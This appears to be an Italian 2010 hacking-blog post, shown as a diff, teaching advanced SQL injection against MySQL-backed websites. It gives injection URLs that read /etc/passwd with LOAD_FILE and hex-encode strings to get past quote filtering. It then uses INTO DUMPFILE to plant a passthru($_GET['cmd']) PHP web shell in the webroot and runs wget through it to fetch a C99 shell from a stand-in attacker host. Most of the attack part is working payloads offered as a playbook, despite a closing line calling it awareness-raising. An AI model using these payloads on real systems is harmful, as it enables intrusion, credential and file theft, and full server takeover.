@@ -1,0 +1,89 @@
+Date: 2010-07-06 00:39:08
+Author: evilsocket
+Categories: Hacking, Papers, Web Hacking
+Tags: asp, c99, db, dumpfile, exploit, into dumpfile, load_file, mysql, PHP, shell, sql, sql injection, web, Web Hacking
+Title: Tecniche avanzate di SQL Injection, quello che non tutti sanno!
+
+Qualche tempo fa scrissi una breve (e decisamente incompleta) <a href="http://www.evilsocket.net/74/introduction-to-sql-injections.html" target="_blank">introduzione alle sql injections</a> che illustrava i concetti di base più l'enumerazione di tabelle e colonne tramite il famoso information_schema.
+
+Sabato scorso son passato all'hack meeting, invitato da un (nuovo) amico, e mi sono imbattuto in uno speech proprio su questa tecnica di intrusione (che devo dire è anche la mia preferita per quanto concerne il web hacking :P) ed il ragazzo che lo stava tenendo ha detto alla fine la frase "con le sql injections si possono fare innumerevoli cose" che mi ha fatto venir voglia di scrivere questo articolo.
+
+Ci sono alcuni aspetti delle SQL injections che in realtà non sono molto conosciuti, ma che aprono davvero un mondo e portano un ipotetico attaccante (o un informatico che deve porre rimedio a questa piaga) nella condizione di avere accessi con privilegi ben superiori a quelli che una "normale" iniezione darebbe.
+<h2><break>Accesso in lettura al file system.</h2>
+MySQL, così come tantissimi altri database, hanno delle funzioni integrate nel linguaggio stesso che offrono funzionalità avanzate all'interno delle query, basti pensare alle funzioni <strong>CONCAT()</strong> o <strong>MID() </strong>per operare sulle stringhe.
+
+Una funzione non molto conosciuta, principalmente perchè son pochi gli scenari nella quale convenga usarla, è la funzione<strong> LOAD_FILE() </strong>che, come suggerisce il nome stesso, serve per caricare il contenuto di un file all'interno di un buffer di MySQL.
+
+Ad esempio, eseguendo la query :
+<blockquote><strong>SELECT</strong> <strong>LOAD_FILE</strong>(<em>'/etc/passwd'</em>)</blockquote>
+Riceveremo come risultato il contenuto del rinomato file ... beh, perchè non utilizzare tale funzione anche all'interno di un injection ?
+
+Invece di un ipotetico :
+<blockquote>http://www.site.com/news.php?id=1 <strong>AND</strong> 1=2 <strong>UNION SELECT</strong> NULL,NULL,username,password <strong>FROM</strong> users<strong><em>/** </em></strong></blockquote>
+Potremmo fregarcene della tabella utenti ed andarci direttamente a spulciare il filesystem :
+<blockquote>http://www.site.com/news.php?id=1 <strong>AND</strong> 1=2 <strong>UNION SELECT</strong> NULL,NULL,<strong>LOAD_FILE</strong>(<em>'/etc/passwd'</em>),NULL<strong><em>/**</em></strong></blockquote>
+<h2>Come aggirare la rogna degli apici.</h2>
+Seguendo l'esempio qui sopra riportato, vorrei parlare di un altro "trick" di MySQL non motlo conosciuto ... spesso durante il testing di una sql injection, ci rendiamo conto che utilizzare degli apici all'interno del codice da noi iniettato diventa una vera rogna, questo specialmente quando la query che esegue la pagina web (e che noi non conosciamo del tutto) è molto complessa, con diverse JOIN ecc, risultando di volta in volta in un errore di sintassi perchè abbiamo messo un apice di troppo (che magari ci è stato segato dalle magic quotes, le puttane!!!).
+
+Questo potrebbe accadere ad esempio, con gli apici utilizzati per passare l'argomento alla funzione LOAD_FILE ... ma in realtà, aggirare questo problema (e metterlo nel cxxo alle gpc!) è abbastanza semplice se si conosce il modo ... basta codificare in esadecimale! :D
+
+Ovvero, invece di utilizzare la dicitura
+<blockquote><strong>SELECT</strong> <strong>LOAD_FILE</strong>(<em>'/etc/passwd'</em>)</blockquote>
+Utilizzeremo
+<blockquote><strong>SELECT</strong> <strong>LOAD_FILE</strong>(<em> 0x2f6574632f706173737764 </em>)</blockquote>
+Dove 0x2f6574632f706173737764 corrisponde alla stringa /etc/passwd codificata in esadecimale ... e così, via gli apici! :P
+
+Questo si può utilizzare anche nei confronti (0x61646d696e = admin) :
+<blockquote><strong>SELECT</strong> NULL,NULL,username,password <strong>WHERE</strong> username=0x61646d696e</blockquote>
+E così via, generalmente ogni qual volta bisognerebbe utilizzare una stringa ma per un motivo o per un altro non possiamo (o vogliamo perchè siam pigri) farlo.
+<h2>Accesso in scrittura al file system.</h2>
+Mi son tenuto questa chicca per ultima perchè è la più sfiziosa :P
+
+Non sarebbe bello poter arrivare, partendo da una semplice sql injection, ad una shell php (o di qual si voglia linguaggio) pronta a runnare sul server in questione, così da poterci spulciare tutto il file system in pace ed eseguire comandi da remoto?
+
+Beh, è fattibilissimo! :P
+
+Analogamenente alla funzione LOAD_FILE precedentemente vista, esiste anche una coppia di keywords MySQL che invece ci permette di inserire del contenuto arbitrario all'interno del file che vogliamo, tale magica accoppiata è <strong>INTO DUMPFILE</strong> .
+
+C'è da specificare una cosa che, anche essendo ovvia, non è così banale ... dovendo specificare come argomento il path completo del file che vogliamo creare (o sovrascrivere!!), è sottointeso che tale cartella debba essere scrivibile dall'utente con i quali privilegi è in esecuzione il demone MySQL.
+
+Se ci interessasse solamente creare un file non necessariamente raggiungibile via web (quindi non nella cartella nella quale apache si aspetta i file html e php), potremmo benissimo scrivere nella /tmp/ che generalmente è accessibile da tutti, utilizzando la query :
+<blockquote><strong>SELECT</strong> 'contenuto' <strong>INTO</strong> <strong>DUMPFILE</strong> '/tmp/blablabla'</blockquote>
+O meglio ancora, codificato in esadecimale come abbiamo visto prima :
+<blockquote><strong>SELECT</strong> 0x636f6e74656e75746f <strong>INTO</strong> <strong>DUMPFILE</strong> 0x2f746d702f626c61626c61626c61</blockquote>
+Dove "contenuto" ovviamente è quello che vogliamo mettere dentro il file ...
+
+Scrivere nella /tmp non è molto utile, a meno che il sito sia affetto anche da una LFI (local file inclusion = inclusione di file locali) e quindi potremmo prima creare il file e successivamente forzare una pagina ad includerlo per eseguirlo.
+
+Quello che ci interessa veramente però (almeno quello che solitamente interessa a me :P) è scrivere nella stessa cartella che contiene il sito, così da poterci mettere una shell ed utilizzarla in tutta comodità.
+
+Non esiste (o almeno io non l'ho trovato) il modo, tramite una query SQL, di trovare il full path della htdocs, però ci sono un paio di metodi che, con un po di intuito e fortuna funzionano il 99% delle volte.
+
+Il primo, tramite il metodo sopra indicato di lettura del file system,  consiste nel leggere il file di configurazione di apache (httpd.conf) che solitamente è contenuto in /etc/[qualcosa] (dove [qualcosa] è cmq un valore che varia di poco da server a server ed è di conseguenza facilmente 'guessabile') e vedere i path dei vari virtual hosts .
+
+Questo metodo però, necessita che l'utente con il quale runna MySQL possa leggere quel file e non sempre questo è possibile anzi, se chi ha configurato il server è bravo, non è quasi mai possibile.
+
+Il secondo metodo invece, funziona praticamente sempre :)
+
+Ormai, la stragrande maggioranza dei siti utilizza applicazioni web cms quali WordPress, PHPNuke (OMFG c'è ancora chi lo usa!!!), PHPFusion, Joomla e così via.
+
+Tali sistemi, al momento dell'installazione, inseriscono in una tabella (che varia da sistema a sistema, ma essendo questi sistemi opensource cmq le tabelle sono note) il full path nel quale sono stati installati, il più delle volte per poter includere correttamente i vari file php che gli servono, altre volte (specialmente nel caso dei forum) per sapere in quale cartella, ad esempio, possono spostare gli allegati uploadati in un post.
+
+Ebbene ... è proprio quello che ci serve!
+
+Abbiamo una sql injection, sappiamo quale sistema PHP gira nel sito, sappiamo quale colonna di quale tabella ci interessa ... ci basterà utilizzare una sql injection che selezioni quella variabile dal database e eccoci qui, abbiamo il full path di installazione del sito che stiamo attaccando!
+
+A questo punto, ipotizzando che il path sia "/var/www/htdocs/sito.com/" (ipotesi tra l'altro non molto distante dalle casistiche reali), potremmo utilizzare una sql injection del tipo :
+<blockquote>http://www.site.com/news.php?id=1 <strong>AND</strong> 1=2 <strong>UNION SELECT</strong> NULL,NULL,'<strong>&lt;?php</strong> <strong>passthru($_GET["cmd"]); ?</strong><strong>&gt;</strong>',NULL <strong>INTO</strong> <strong>DUMPFILE</strong> '/var/www/htdocs/sito.com/lulz.php'/**</blockquote>
+(Magari il tutto opportunamente codificato in hex come visto prima, fate vobis che a me non va XD)
+
+Dalla query risulta evidente come abbiamo scritto un piccolo codice php all'interno della pagina lulz.php, codice che eseguirà qualsiasi comando gli venga passato tramite la variabile "cmd", mostrandone il contenuto ... a questo punto, o utiliziamo lo script direttamente, del tipo :
+<blockquote>http://www.site.com/lulz.php?cmd=ls</blockquote>
+Oppure, cosa ancor più comoda, potremmo utilizzarlo per scaricare, tramite wget, una shell un attimino più decente (magari una C99) :
+<blockquote>http://www.site.com/lulz.php?cmd=wget%20http://www.evilsite.com/c99.txt</blockquote>
+<blockquote>http://www.site.com/lulz.php?cmd=mv%20c99.txt%20c99.php</blockquote>
+Ed eccoci qua, da una semplice e comune SQL injection, siamo passati ad avere una shell sul server! Non male vero? Soprattutto se pensate che tramite queste funzioni è possibile accedere, tramite i privilegi del demone MySQL, anche ad eventuali risorse di rete ... a voi la ricerca! :P
+
+Ci tengo a precisare che non sto scrivendo un articolo di questo genere, dopo tanto tempo che non ne scrivevo, per incitare le persone a lamerare, ma solo per sensibilizzare quei programmatori che troppo spesso, soprattutto in ambito professionale, sottovalutano dei bug apparentemente piccoli ma che, come mostrato, possono portare a conseguenze veramente disastrose.
+
+Cya the next time! :)
